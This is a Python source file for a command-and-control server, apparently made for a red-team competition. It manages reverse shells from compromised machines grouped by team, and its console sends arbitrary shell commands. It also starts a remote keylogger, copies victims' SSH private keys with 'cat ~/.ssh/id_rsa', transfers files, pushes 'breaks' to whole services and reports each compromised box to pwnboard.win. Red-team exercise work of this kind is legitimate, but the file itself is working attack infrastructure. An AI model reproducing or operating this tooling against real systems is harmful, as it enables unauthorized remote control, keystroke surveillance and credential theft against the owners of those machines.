import json
import subprocess
import os
import socket, threading, time
import sys
import signal
import pty
from cmd import Cmd
import requests
from serverDependencies.team import *
from serverDependencies.service import *
from serverDependencies.connection import *
from serverDependencies.hostname import *
import re
import gnureadline

#TODO Develop new shell with cmd module
#TODO Encrypt traffic

# class MainShell(cmd):
#     pass 
        
#DEFAULT VALUES
SERVER_ADDR = "127.0.0.1"
SERVER_PORT = 8080
BUFFER_SIZE = 1024 * 128 #128KB max size
CURRENT_CONNECTIONS_CLASS = [] #TODO store as a dictionary with IP:Connection(class)
TEAMS = {}
SERVICES = {}
UNASSIGNED_CONNECTIONS = []
IP_FORMAT = "X.X.TEAM.HOST"

#Start server and listen for new connections
def startServer():
    asciiArt = '''
 _____                 _              _     _____             _             _ 
/  __ \               | |            | |   /  __ \           | |           | |
| /  \/ ___  _ __  ___| |_ __ _ _ __ | |_  | /  \/ ___  _ __ | |_ _ __ ___ | |
| |    / _ \| '_ \/ __| __/ _` | '_ \| __| | |    / _ \| '_ \| __| '__/ _ \| |
| \__/\ (_) | | | \__ \ || (_| | | | | |_  | \__/\ (_) | | | | |_| | | (_) | |
 \____/\___/|_| |_|___/\__\__,_|_| |_|\__|  \____/\___/|_| |_|\__|_|  \___/|_|
                                                                              
                                                                              
    '''
    print(asciiArt)
    server_sock.listen(5)
    print()
    print(f"Server is listening on {SERVER_ADDR}:{SERVER_PORT}")
    print()
    SERVER_UP = True
    try:
        while SERVER_UP:
            client_sock, addr = server_sock.accept()
            IP = getIPFromClient(client_sock)
            # IP = client_sock.recv(BUFFER_SIZE).decode()
            drop = False #were not going to drop it
            new = True #it is new
            for client in CURRENT_CONNECTIONS_CLASS: #if the client is already connected
                if IP == client.IP: #ping the client box and if we don't get pong back, drop the shell and take the new one
                    new = False #it isn't new, we already have it silly!
                    try:
                        if client.isUpCheck():
                            drop = True #cool we have a working shell, drop the new one
                        else:
                            client.socket = client_sock #bro the old shell is borked, just take the new one

                    except: #if the current socket doesn't work, just swap the sockets
                        client.socket = client_sock #bro the old shell is borked, just take the new one
                    break #stop looking through clients
            if drop: #if there is already a connection, drop the new one
                client_sock.send("ENDCONNECTION".encode())
                continue
            if new:
                try:
                    X = Connection(addr,client_sock, IP, BUFFER_SIZE)
                    assign_client(X)
                except Exception as e:
                    continue
                CURRENT_CONNECTIONS_CLASS.append(X)
    except (KeyboardInterrupt, SystemExit, ConnectionAbortedError):
        server_sock.close()
        shutdown_clients()
    except (ConnectionResetError) as e:
        print("Error on a connection. Continuing.")
        
def selectClient():
    selectedTeam = None
    selectedClient = None
    print("\nSelect Team")
    if len(TEAMS) == 0:
        print("No active teams!")
        return
    for team in TEAMS:
        print(f"{TEAMS[team].identity} ({len(TEAMS[team].clients)})")
    while not selectedTeam:
        try:
            x = input("Select a team: ")
            if "exit" in x:
                return
            selectedTeam = TEAMS[x]
        except:
            pass
    print("Select Client")
    if len(selectedTeam.clients) == 0:
        print("Team has no clients!")
        return
    for i,client in enumerate(selectedTeam.clients):
        print(f"{i} - {str(client.IP)} ({client.getHostname()})")
        i += 1
    while not selectedClient:
        try:
            x = input("Select a client: ")
            if "exit" in x:
                return
            selectedClient = selectedTeam.clients[int(x)]
        except:
            pass
    client_console(selectedClient)

#Take socket and addr and issue shell
def handleClient(client):
    addr = client.IP
    while True:
        try:
            user_in = input()
            if user_in == 'exit':
                client.send(user_in) #dont need to receive
                return True
            elif user_in == '':
                print(f"\n{addr}>",end='')
            elif user_in.split()[0] == "cd":
                client.send(user_in) 
                print(client.getResponse()) 
                print(f"{addr}>",end='')
                continue
            else:
                client.send(user_in)
                serv_resp = client.getResponse()
                if serv_resp: print(f"{serv_resp}")
                print(f"{addr}>",end='')
        except socket.timeout as e:
            print("Process did not return anything. \n" + str(e))
            print(f"{addr}>",end='')
        except BrokenPipeError as e:
            print("Connection closed. Broken pipe.")
            removeClient(client)
            return False
        except ConnectionResetError as e:
            print("Connection reset by client.")
            removeClient(client)
            return False
        except Exception as e:
            print("Error sending command! \n" + str(e))
            print(f"{addr}>",end='')
            continue

def removeClient(client):
    client.connected = False
    try: #try to remove everything, but it might already be gone
        client.connected = False
        for service in SERVICES:
            if client in SERVICES[service].clients:
                SERVICES[service].clients.remove(client)
        client.team.unassign(client)
        HOSTNAMES[HOSTNAMES.index(client.getHostname())].removeClient(client)
        CURRENT_CONNECTIONS_CLASS.remove(client)
        client.socket.close()
    except Exception as e: 
        client.socket.close()
        try:
            removeClient(client)
        except:
            pass
        pass

######TODO refactor this function
def copyKey(client_sock):
    try:
        client_sock.send("hostname".encode())
        hostName = client_sock.recv(BUFFER_SIZE).decode().strip()
        if os.path.exists(f"{os.path.expanduser('~')}/client_keys/{hostName}"):
            print("Private key exists for: " + hostName)
            print("\n>",end="")
            return
        try:
            subprocess.run(f"mkdir -p {os.path.expanduser('~')}/client_keys/{hostName}",shell=True)
        except:
            subprocess.run(f"mkdir -p {os.path.expanduser('~')}/client_keys",shell=True)
            subprocess.run(f"mkdir -p {os.path.expanduser('~')}/client_keys/{hostName}",shell=True)
        client_sock.send("cat ~/.ssh/id_rsa".encode())
        subprocess.run(f"touch {os.path.expanduser('~')}/client_keys/{hostName}/id_rsa",shell=True)
        with open(f"{os.path.expanduser('~')}/client_keys/{hostName}/id_rsa","w") as file:
            file.write(client_sock.recv(BUFFER_SIZE).decode())
            print(f"Private key copied for: {hostName}")
        print("\n>",end="")
    except:
        print("Private key NOT copied!")
    
def resetAll():
    for client in CURRENT_CONNECTIONS_CLASS:
        removeClient(client) #TODO Might break things

#Main Console for C2
def handleCommand():
    while True:
        try:
            cmd = input("cmd> ")
            if cmd.lower() == "list" or cmd.lower() == "ls":
                list_clients()
            elif cmd.lower() == "lsteam" or cmd.lower() == "listteam":
                listTeams()
            elif cmd.lower() == "sel" or cmd.lower() == "select":
                selectClient()
            elif "lsall" in cmd.lower():
                for team in TEAMS:
                    TEAMS[team].listExpectedClients()
            elif "lshost" in cmd.lower():
                for host in HOSTNAMES:
                    host.listHosts()
            elif cmd.lower() == "resetall":
                resetAll()
            elif cmd.lower() == "service":
                serviceShell()
            elif cmd.lower() == "selhost":
                hostnameShell()
            elif cmd.lower() == "help":
                print("\nHelp Menu: \n\tUse 'list' to list active connections. \
                    \n\tUse 'select' to choose a client from the list. \
                    \n\tUse 'lsteam' to list each team's connections. \
                    \n\tUse 'lsall' to list all expected clients and their status. \
                    \n\tUse 'service' to list services. \
                    \n\tUse 'lshost' to list all hosts under a hostname. \
                    \n\tUse 'resetall' to send a reset to all clients. \
                    \n\tUse 'help' to show this menu. \
                    \n\tUse 'exit' to quit the program.")
            elif cmd.lower() == "exit":
                print("[SERVER] Server is closing. Goodbye!")
                shutdown_clients() 
                server_sock.close()
                break
            elif cmd == "":
                continue
            else:
                print("Command unknwon. Use 'help' to list commands.")
        except (KeyboardInterrupt, SystemExit, ConnectionAbortedError):
            print("\nUse 'exit' to close.")
        except Exception as e:
            print("Invalid use of command! \n" + str(e))
            
def hostnameShell():
    print("Select a host to open a shell for:")
    for host in HOSTNAMES:
        host = HOSTNAMES[host]
        print(f">> {host.hostname} ({len(host.clients)})")
    while True:
        userIn = input("Enter a hostname: ")
        if userIn == "exit":
            return
        for host in HOSTNAMES:
            host = HOSTNAMES[host]
            if host.hostname == userIn:
                while userIn != "exit":
                    userIn = input(f"Enter a command to send to all '{host.hostname}' clients: ")
                    if userIn != "exit":
                        host.sendToAll(userIn)
                    else:
                        print("Exiting host shell.")
                        return

def serviceShell():
    userIn = "notAService"
    while userIn not in SERVICES.keys():
        if userIn.lower() == "exit":
            return
        print("\nPlease select a service below: ")
        for service in SERVICES:
            print("\t>> " + service + " - " + str(len(SERVICES[service].clients)) + " active clients")
        userIn = input("Enter the name of the service you want to select: ")
    service = SERVICES[userIn]
    while "exit" not in userIn:
        userIn = input(f"{service.name}>").lower()
        if "help" in userIn:
            print("Client help menu:")
            print("\tEnter ls to list all stored breaks and their purpose")
            print("\tEnter select to select a break to send")
            print("\tEnter shell for a shell to every client connected under this service")
            print("\tEnter clients for a list of currently connected clients")
            print("\tUse reload to reload the break list")
        elif "ls" in userIn or "list" in userIn:
            service.getBreaks()
            service.listBreaks()
        elif "select" in userIn or "sel" in userIn:
            service.sendBreak()
        elif "shell" in userIn:
            service.shell()
        elif "clients" in userIn:
            service.listClients()
        elif "reload" in userIn:
            service.getBreaks()
        elif "exit" in userIn:
            break
        else:
            print("Invalid command!")

#List Current Connections
def list_clients():
    results = ""
    i = 0
    for client in CURRENT_CONNECTIONS_CLASS:
        try:
            cwd = None
            if not client.send('pwd'):
                raise Exception
            cwd = client.recv()
            client.send('whoami')
            whoami = client.recv().strip()
            if cwd is None or cwd == "":
                removeClient(client)
        except:
            removeClient(client)
            continue

        results += str(i) + " - " + whoami + "@" + str(client.IP) + ":" + str(client.port) + ":" + str(cwd) + "\n"
        i+=1

    if len(CURRENT_CONNECTIONS_CLASS) != 0:
        print("[SERVER] ACTIVE CLIENTS:")
        print(results)
    else:
        print("No active connections!")

def addTeam(identity):
    TEAMS[identity] = Team(str(identity))
    print("Team \"" + str(identity) + "\" created successfully.")

def assignService(client, service, cloud:bool):
    if cloud: #if it's a cloud box, search the cloud services
        for i in SERVICES:
            if service in SERVICES[i].cloudIdentifier:
                SERVICES[i].assign(client)
    else:
        for i in SERVICES:
            if service in SERVICES[i].identifier:
                SERVICES[i].assign(client)

def listTeams():
    print("Team's Connections:")
    for team in TEAMS:
        TEAMS[team].listClients()

def listTeamsFull():
    print("Team's Connections:")
    for team in TEAMS:
        TEAMS[team].listStatusClients()

#Console to send commands to a client when user selects client
def client_console(client): #previously took in cmd
    try:
        connection = client
        print("Connected to: " + str(client.IP) + ":" + str(client.port))
        while True:
            print("Console: " + str(client.IP)+">",end="")
            newCMD = input()
            if "shell" in newCMD:
                print("Active Shell On: " + str(client.IP) + ":" + str(client.port))
                print("\n" + str(client.IP) + ">",end = '')
                if not handleClient(client): #if this errors, break the shell
                    break
            elif "dl" in newCMD: #Download file
                download_file(newCMD,client.getSocket()) #TODO Refactor and fix this
            elif "up" in newCMD: #Upload file
                upload_file(newCMD,client.getSocket()) #TODO Refactor and fix this
            elif "keylogger" in newCMD:
                start_keylog(newCMD,client.getSocket()) #TODO Refactor and fix this
            elif "tty" in newCMD:
                startTTY(client.IP)
            elif "key" in newCMD.lower():
                copyKey(client.getSocket()) #TODO Refactor and fix this
            elif "ncport" in newCMD.lower(): #TODO Refactor and fix this
                client.send("ncport")
                print("Netcat is being hosted on: " + client.IP + ":" + client.recv())
            elif "reset" in newCMD.lower():
                try:
                    connection.socket.close()
                except:
                    pass
                removeClient(client)
                return
            elif "help" in newCMD: #Help menu
                print("\nHelp Menu:\
                    \n\tUse 'exit' to return to main menu. \
                    \n\tUse 'help' to show this menu. \
                    \n\tUse 'shell' to gain a shell on the client's machine \
                    \n\tUse 'key' to copy the clients SSH key to your machine \
                    \n\tUse 'dl' to download a file.\
                    \n\tUse 'ul' to upload a file.\
                    \n\tUse 'keylogger' to start a live keylog of the clients machine.\
                    \n\tUse 'ncport' to get the port the shell is listening on.\
                    \n\tUse 'ENDCONNECTION' in shell to end the connection.\
                    \n\tUse 'tty' to start a new TTY in netcat.\n")
            elif "exit" in newCMD:
                break
            elif newCMD == '':
                continue
            else:
                print("Command unknwon. Use 'help' to list commands.")
    except Exception as e:
        print("Invalid use of command! \n" + str(e))

#Used to break keylogger with ctrl-z
def ctrlC(signum, frame):
    raise KeyboardInterrupt

#TODO Refactor and fix this
def start_keylog(cmd,conn):
    signal.signal(signal.SIGTSTP, ctrlC)
    signal.signal(signal.SIGTERM, ctrlC)
    print("Keylogger starting...\nIMPORTANT:\nUse ctrl+z & ctrl+c to end logging.")
    conn.send("START_KEYL0GGER".encode())
    try:
        log = ''
        print()
        os.system('cls' if os.name == 'nt' else 'clear') #Clear the screen. Use cls on Windows or clear on Unix
        while True:
            print("Keylogger in progress...\nUse ctrl+z & ctrl+c to end logging.\n")
            print(f"{log}",end="\r")
            out = conn.recv(BUFFER_SIZE).decode()
            if out == "NO_DEPENDENCIES":
                print("Dependencies for keylogger not installed on target.")
                break
            os.system('cls' if os.name == 'nt' else 'clear') #Clear the screen. Use cls on Windows or clear on Unix
            if out == "BACKSPACE": #If the user hit backspace, delete one keystroke from the string
                try:
                    if log[len(log)-1] == ")": #check if the last char is a ), it might be a Key.
                        i = len(log)-1 #Set i = length of the log - 1
                        while(log[i]) != "(": #Iterate backwards until we find a (
                            i-=1
                        if log[i:i+4] == "(Key": #If the string is '(Key' then we found a key to delete. 
                            log = log[:i-1] #Delete the keystroke and one char before it
                        else:
                            log = log[:-1]
                    else:
                        log = log[:-1] #If the last char isn't a ), then just delete one char
                except IndexError:
                    log = log[:-1] + ' ' #If index out of bounds, just delete one and add a space
            elif out == "ENTER": #If the user hit enter, make a new line
                log += "\n"
            else:
                log += out

    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear') #Clear the screen. Use cls on Windows or clear on Unix
        conn.send("KEY_L0GGER-END".encode())
        print("Keylogger ending... Returning to client menu.")

#TODO Refactor and fix this
def download_file(cmd,conn):
    try:
        conn.send(("DOWNLOAD_FILE_FROM_S3RVER").encode()) #Tell client we want to download
        path = cmd.replace("dl ","") #Get the path of the requested download
        if conn.recv(BUFFER_SIZE).decode() == "READY": #Wait for client to be ready
            conn.send(path.encode()) #Send the path to client
            path = path.split("/") #Split the path by slash
            with open(path[len(path)-1],"ab") as f: #Open a file with just the filename
                data = conn.recv(BUFFER_SIZE) #Recieve data from client
                while data: #While data is not None
                    if data.decode() == "DOWNLOADING_FILE_FROM_S3RVER_COMPLETE": #If it is done, break
                        break
                    elif data.decode() == "DOWNLOAD_ERROR": #If there's an error, tell us and break
                        print("File was not found on target machine.")
                        break
                    f.write(data) #Write to the file
                    conn.send("ACK".encode()) #Tell the client we got it
                    data = conn.recv(BUFFER_SIZE) #Wait for more data
            print(path[len(path)-1] + " saved to: " + os.getcwd()) #Print that the file was downloaded and saved
    except KeyboardInterrupt as e:
        print("File Download Stopped.")

#TODO Refactor and fix this
def upload_file(cmd,conn):
    try:
        path = cmd.replace("up ","")
        conn.send(("UPLOADING_FILE_FROM_S3RVER").encode())
        if conn.recv(BUFFER_SIZE).decode() == "READY":
            conn.send(path.encode())
            with open(path,"rb") as f:
                data = f.read(BUFFER_SIZE)
                while data:
                    conn.send(data)
                    if(conn.recv(BUFFER_SIZE).decode()) == "ACK":
                        data = f.read(BUFFER_SIZE)
                    else:
                        print("An error has occured!")
                        break

                conn.send("UPLOADING_FILE_FROM_S3RVER_COMPLETE".encode())
                if conn.recv(BUFFER_SIZE).decode() == "DONE":
                    print("File uploaded successfully!")

    except FileNotFoundError or FileExistsError as e:
        conn.send("UPLOADING_FILE_FROM_S3RVER_COMPLETE".encode())
        print("File not found! \n"+ str(e))
    except KeyboardInterrupt:
        print("File Upload Stopped.")

#Start server as a thread to constantly accept new clients, then open the C2 console.
def create_threads():
    t = threading.Thread(target=startServer) 
    t.daemon = True
    t.start()
    t = threading.Thread(target=checkInThread)
    t.daemon = True
    t.start()
    time.sleep(.5)
    handleCommand()

#Open TTY by connecting via netcat
def startTTY(IP):
    OS = sys.platform
    if OS == "win32" or "cygwin": #If the machine is Windows
        pass
    if OS == "linux" or "darwin" or "freebsd": #If the machine is linux or MacOS or FreeBSD
        try:
            print("Entering TTY!")
            pty.spawn(f"/usr/local/bin/netcat {IP} 8081")
        except KeyboardInterrupt:
            print("Exiting TTY!")

#Disconnect all clients and end sockets - UPDATED TO RESET CONNECTION TO KEEP ALIVE
def shutdown_clients():
    for client in CURRENT_CONNECTIONS_CLASS:
        try:
            client.socket.close()
        except:
            continue

def createService(service):
    if service not in SERVICES:
        SERVICES[service] = Service(service) #make the service
        print("Successfully created service: " + service)
        
#Takes in config file and creates necessary objects 
def setup():
    try:
        with open("config.json") as config:
            config = json.load(config) #Load the config file
        # for service in config["topology"][0]["services"].split(","): #Create a service for each service
        #     createService(service)
        global TEAMS_INT
        TEAMS_INT = int(config["topology"][0]["teams"]) #Pull the # of all teams
        global SERVER_ADDR
        SERVER_ADDR = config["topology"][0]["serverIP"]
        global SERVER_PORT
        SERVER_PORT = int(config["topology"][0]["serverPort"])
        global CHECK_IN_PORT
        CHECK_IN_PORT = int(config["topology"][0]["checkInPort"])
        for i in range(TEAMS_INT): #Create all teams and give them a list of expected clients
            addTeam(str(i))
        global HOSTNAMES
        HOSTNAMES = dict()
        for i in range(len(config["hosts"])):
            currentHost = config["hosts"][i]
            createHost(currentHost)
            makeExpectedList(i,currentHost["ip"]) #TODO refactor this
            # print("Created the host: '" + host + "' with IP format: '" + hostDict[host] + "'")
        #parse each host and make a new host for each hostname
    except Exception as e:
        print("Could not parse config file! Please restart C2 with the correct format!")
        global server_sock
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #bind the server to that IP and port
    server_sock.bind((SERVER_ADDR, SERVER_PORT))

def createHost(host):
    #Make expected list for services
    #Create the team
    #Make expected list
    #Tell the host what services it has
    hostname = host["hostname"]
    ip = host["ip"]
    os = host["os"]
    services = host["service"]
    HOSTNAMES[hostname] = Hostname(hostname,ip,os,TEAMS_INT)
    for service in services:
        createService(service)
        SERVICES[service].addIdentifier(ip)
        HOSTNAMES[hostname].services.append(SERVICES[service])
        #tell the service to expect more ips
        for i in range(TEAMS_INT):
            expectedHost = ip.replace("x",str(i))
            SERVICES[service].expectedClients.append(expectedHost)
            print(f"Added IP: {expectedHost} to {hostname}")
    print("Successfully created host: " + hostname)

def makeExpectedList(teamNumber,ipFormat):
    expected = list()
    for i in range(TEAMS_INT):
        tempHost = ipFormat.replace("x",str(i))
        expected.append(tempHost)
        #use ipSyntaxCloud
    TEAMS[str(teamNumber)].expectedHosts += expected

def checkInThread():
    time.sleep(10)
    while True:
        for client in CURRENT_CONNECTIONS_CLASS:
            try:
                client.send("beacon_ping") #send ping and expect a pong back
                resp = client.recv()
                sendUpdate([client.IP])
                if resp != "beacon_pong": #if the client sends something else back
                    removeClient(client)
            except (BrokenPipeError,ConnectionRefusedError,ConnectionResetError) as e:
                removeClient(client)
            except: #anything else breaks? keep going
                pass
        time.sleep(60) #check in every minute

def reverseCheckInThread():
    pass

def assign_client(client):
    for host in HOSTNAMES:
        currentHost = HOSTNAMES[host]
        if client.IP in currentHost.expectedIPs:
            currentHost.addClient(client)
            client.hostname = host
            for service in currentHost.services:
                service.assign(client)
            break
    for team in TEAMS:
        if client.IP in TEAMS[team].expectedHosts:
            TEAMS[team].assign(client)
            break
    if team not in TEAMS:
        # print("Team \"" + team + "\" does not exist! Creating..." )
        addTeam(str(team))
        TEAMS[team].assign(client)

def sendUpdate(ips, name="constctrl"):
    host = "http://pwnboard.win/pwn/boxaccess"
    # Here ips is a list of IP addresses to update
    # If we are only updating 1 IP, use "ip" and pass a string
    data = {'ips': ips, 'type': name}
    try:
        req = requests.post(host, json=data, timeout=3)
        # print(req.text)
        return True
    except Exception as e:
        # print(e)
        return False
    
def getIPFromClient(clientSocket):
    clientSocket.send("getIP".encode())
    out = clientSocket.recv(BUFFER_SIZE).decode()
    regex = re.compile(r'(10\.\d{1,2}\.\d{1,3}\.\d{1,3})') #hard code for IRSeC, look for 172.X.X.X, or 10.X.X.X
    regex_cloud = re.compile(r'(127\.\d{1,2}\.\d{1,3}\.\d{1,3})')
    regex_ip_general = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
    out = str(out).strip()
    try:
        IP = regex.search(out)[0] #try to find local IP
    except:
        try:
            IP = regex_cloud.search(out)[0] #if it's the cloud, run that regex
        except:
            try: #try to find a general IP
                IP = regex_ip_general.search(out)[0] #try to find local IP
            except:
                IP = "0.0.0.0"
    return IP

if __name__ == "__main__":
    print("[SERVER] Server is starting...") 
    setup()
    time.sleep(1)
    create_threads()